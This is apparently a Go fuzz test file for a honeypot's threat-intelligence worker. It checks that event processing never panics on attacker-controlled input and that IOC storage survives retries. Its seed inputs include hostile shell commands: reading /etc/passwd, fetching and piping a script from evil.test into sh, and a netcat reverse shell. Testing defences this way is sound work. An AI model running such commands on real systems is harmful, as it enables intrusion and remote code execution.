package intelligence

import (
	"context"
	"testing"

	"github.com/qpot/qpot/internal/database"
)

// FuzzWorkerRunOnce drives the worker's whole batch pipeline - classify, tag,
// and IOC insert - with attacker-controlled event fields. The worker
// processes data an attacker fully controls (the command they ran, the
// username/password they tried, raw payload bytes, the source IP), so runOnce
// must never panic regardless of what those fields contain.
func FuzzWorkerRunOnce(f *testing.F) {
	f.Add("cat /etc/passwd", "root", "admin", "1.2.3.4", "ssh", []byte("payload"))
	f.Add("wget http://evil.test/x.sh | sh", "", "", "::1", "telnet", []byte{0x00, 0xff})
	f.Add("", "", "", "", "", []byte(nil))
	f.Add("nc -e /bin/sh 10.0.0.1 4444", "user", "pass", "999.999.999.999", "", []byte("\x00\x01\x02"))

	f.Fuzz(func(t *testing.T, command, username, password, srcIP, proto string, payload []byte) {
		ev := &database.Event{
			Honeypot:  "cowrie",
			SourceIP:  srcIP,
			Protocol:  proto,
			EventType: "command",
			Username:  username,
			Password:  password,
			Command:   command,
			Payload:   payload,
			Metadata:  map[string]string{"raw": command},
		}
		// Two events: one classifiable-looking, one near-empty, to cover the
		// classified/unclassified branches in the same batch.
		db := &fakeDB{events: []*database.Event{ev, {Honeypot: "cowrie", SourceIP: srcIP}}}
		w := newTestWorker(t, db)
		// Must not panic.
		_ = w.runOnce(context.Background())
	})
}

// FuzzWorkerIOCRetry checks the persistence invariant under transient storage
// failures, in addition to the existing no-panic event-input target.
func FuzzWorkerIOCRetry(f *testing.F) {
	f.Add(false, uint8(1), "id")
	f.Add(true, uint8(3), "wget http://example.test/payload")
	f.Add(false, uint8(0), "\x00\xff")
	f.Fuzz(func(t *testing.T, batch bool, failures uint8, command string) {
		if len(command) > 4096 {
			t.Skip()
		}
		testWorkerIOCRetry(t, batch, int(failures%4), command)
	})
}
